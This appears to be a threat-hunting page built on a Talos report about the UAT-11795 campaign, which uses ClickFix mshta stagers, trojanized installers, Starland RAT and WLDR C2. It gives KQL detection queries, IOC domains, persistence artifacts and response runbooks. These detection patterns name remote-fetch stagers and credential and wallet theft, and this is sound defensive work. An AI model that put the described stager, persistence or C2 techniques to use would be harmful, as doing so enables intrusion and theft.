    base64 / downloadstring in the command line.

UAT-11795 deploys novel Starland RAT and bespoke WLDR C2 implant in financially motivated campaign

Cisco Talos
2026-07-16 17 use cases 10 techniques 7 kill-chain phases detected

Cisco Talos is disclosing UAT-11795, a sophisticated, Russian-speaking, financially motivated adversary that has been conducting a malicious campaign targeting users in the U.S. and Europe since at least June 2025.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] UAT-11795 mshta.exe ClickFix HTA stager fetching from Starland staging domains · Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Article-specific behavioural hunt — UAT-11795 deploys novel Starland RAT and bespoke WLDR C2 implant in financially
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Trojanized MobaXterm/WebEx/DBeaver/FaceIT installer spawning Python interpreter · [LLM] WLDR/Starland persistence: scheduled task named PythonLauncher-{random} · Suspicious browser extension installation · Scheduled task created with suspicious image / encoded args · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Starland/WLDR C2 beacon to UAT-11795 campaign domains · [LLM] Starland RAT Polygon smart-contract fallback C2 resolution via scripting host · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] UAT-11795 Telegram bot beacon (skuefq_bot / komandastuk_bot) from scripting host · Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process
UAT-11795 mshta.exe ClickFix HTA stager fetching from Starland staging domains AIDelivery High
Hunts mshta.exe launching a weaponized HTA whose command line or outbound connection references UAT-11795 staging/C2 domains (zynaris.io, eorthopaedics.com, sastoro.com, web-devtools.com). This is the ClickFix-delivered initial-access stage that pulls the trojanized installer and byte-compiled Python loader. Rationale: Anchors on mshta.exe (LOLBIN) plus the exact UAT-11795 staging/C2 domains from the article — the domain literals make this near-zero FP versus generic mshta hunting. Cross-checked BleepingComputer and CyberPress write-ups. Cross-checked against: • https://www.bleepingcomputer.com/news/security/russian-hackers-trojanize-webex-zoom-apps-to-push-starland-malware/ • https://cyberpress.org/uat-11795-spreads-dual-backdoors/
ATT&CKT1218.005 T1204.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher detonating the sample in a sandbox on a monitored host
  • Threat-intel analyst pasting the IOC domain into a test HTA
  • Red-team engagement replaying the ClickFix lure
  • Web-filtering/proxy test tools embedding the domain string in an mshta test
Suppression filter
| where InitiatingProcessFileName !in~ ("cmd.exe") or true // keep all; refine by excluding known sandbox device groups: | where DeviceName !startswith "SANDBOX-"
Response runbook
1) Triage: pull the full mshta command line and the downloaded HTA/installer; confirm the domain resolved and returned content (check DeviceNetworkEvents for the same host/time). 2) Contain: isolate the host, block all six domains at proxy/DNS, kill mshta and any child python.exe/pythonw.exe. 3) Hunt: search the host for a trojanized installer (MobaXterm/WebEx/Zoom/DBeaver/FaceIT), a PythonLauncher-* scheduled task, and outbound beacons carrying a C: volume-serial HWID path.

| where ProcessCommandLine has_any ("zynaris.io","eorthopaedics.com","sastoro.com","web-devtools.com","windowscreenrepairnearme.com","aipythondevs.com")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
SecurityEvent

| where EventID == 4688
| where NewProcessName endswith "\\mshta.exe"
| where CommandLine has_any ("zynaris.io","eorthopaedics.com","sastoro.com","web-devtools.com","windowscreenrepairnearme.com","aipythondevs.com")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Trojanized MobaXterm/WebEx/DBeaver/FaceIT installer spawning Python interpreter AIInstallation High
Hunts UAT-11795 trojanized NSIS installers (MobaXterm_v26.1.exe, WebEx_Client.exe, dbeaver-ce-windows-x86_64.exe, FaceitInstaller_x64.exe) spawning python.exe/pythonw.exe, which is the byte-compiled Python loader that decodes and runs Starland RAT in memory. Legitimate versions of these installers do not launch a Python interpreter. Rationale: Parent = the exact trojanized installer filenames from Talos' Table 1, child = python interpreter — legit MobaXterm/WebEx/DBeaver/FaceIT setups never spawn Python, so the parent/child pair is high-fidelity. Corroborated by BleepingComputer. Cross-checked against: • https://www.bleepingcomputer.com/news/security/russian-hackers-trojanize-webex-zoom-apps-to-push-starland-malware/ • https://malware.news/t/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/123963
ATT&CKT1204.002 T1059.006
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A developer packaging a legitimate Python-bundled build using an identically named installer during testing
  • DBeaver plugin that shells out to a Python helper (rare, usually via javaw not the installer)
  • Sandbox detonation of the sample by an analyst
  • Software-repackaging tools that wrap installers and inject a Python post-install step
Response runbook
1) Triage: hash the installer and the python payload; confirm the installer is unsigned/mismatched-signature vs the legitimate vendor build and locate the .pyc loader on disk. 2) Contain: isolate host, kill python/pythonw, quarantine the installer and %TEMP% drops. 3) Hunt: check for follow-on x64/x32 shellcode drops (CastleStealer/Remcos), PythonLauncher-* scheduled task, and C2 beacons to the campaign domains.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("MobaXterm_v26.1.exe","WebEx_Client.exe","dbeaver-ce-windows-x86_64.exe","FaceitInstaller_x64.exe")
| where FileName in~ ("python.exe","pythonw.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName has_any ("MobaXterm_v26.1.exe","WebEx_Client.exe","dbeaver-ce-windows-x86_64.exe","FaceitInstaller_x64.exe")
| where NewProcessName endswith "\\python.exe" or NewProcessName endswith "\\pythonw.exe"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

WLDR/Starland persistence: scheduled task named PythonLauncher-{random} AIInstallation High
Hunts creation of a scheduled task whose name begins with 'PythonLauncher-' (followed by 3 random characters) via New-ScheduledTask/schtasks — the persistence mechanism UAT-11795 uses to relaunch the Python loader/WLDR agent. The name prefix is a fixed campaign artifact. Rationale: The literal 'PythonLauncher-' task-name prefix (verbatim code block from the article) combined with a task-creation verb is a unique campaign fingerprint with essentially no benign collision. Cross-checked against: • https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/
ATT&CKT1053.005
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • An internal automation tool that legitimately names tasks 'PythonLauncher-' (extremely unlikely but verify with the owning team)
  • IR/DFIR teams re-registering the task during controlled detonation
  • EDR replay of the sample in a lab
Response runbook
1) Triage: dump the task XML/action to see the exact python payload path it launches; note the 3-char suffix and creating user. 2) Contain: delete the scheduled task, isolate host, kill the launched python/powershell. 3) Hunt: pivot to the payload path for the byte-compiled loader, then check for WLDR PowerShell stager (Runspace engine) and C2 beacons to eorthopaedics.com/sastoro.com /feed/ and /alpha/ paths.

| where Timestamp > ago(30d)
| where ProcessCommandLine has "PythonLauncher-"
| where ProcessCommandLine has_any ("New-ScheduledTask","Register-ScheduledTask","schtasks","/create")
| project Timestamp, DeviceName, AccountName, FileName, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where CommandLine has "PythonLauncher-"
| where CommandLine has_any ("New-ScheduledTask","Register-ScheduledTask","schtasks","/create")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Starland/WLDR C2 beacon to UAT-11795 campaign domains AICommand & Control High
Hunts endpoint DNS/network activity to the UAT-11795 C2 and staging domains (eorthopaedics.com, sastoro.com, web-devtools.com, windowscreenrepairnearme.com, aipythondevs.com, zynaris.io). These serve HWID-parameterized C2 envelopes and shellcode; the C: volume-serial HWID forms the final URL path component. Rationale: Direct IOC match on the six campaign domains from the Talos article; DNS/network resolution of any of them is high-fidelity regardless of the HWID path. Domains corroborated via BleepingComputer and OffSeq threat radar. Cross-checked against: • https://www.bleepingcomputer.com/news/security/russian-hackers-trojanize-webex-zoom-apps-to-push-starland-malware/ • https://radar.offseq.com/threat/novel-starland-rat-and-bespoke-wldr-c2-implant-dep-e6ab953c0d52f095

  • Passive-DNS/sinkhole infrastructure pointed at these domains
  • Security-product URL detonation reaching out to the domain
Suppression filter
DeviceNetworkEvents | where InitiatingProcessFileName in~ ("python.exe","pythonw.exe","powershell.exe","pwsh.exe","mshta.exe") // pivot to raise severity when a scripting host is the initiator
Response runbook
1) Triage: identify the initiating process (python/pythonw/powershell/mshta = high concern) and whether the URL path carried a HWID/volume-serial component. 2) Contain: block all six domains at DNS/proxy, isolate the beaconing host. 3) Hunt: on confirmed hosts, look for the PythonLauncher-* task, trojanized installer, Polygon RPC fallback lookups, and Telegram bot beacons (bot IDs 8384531459 / 7993597060).
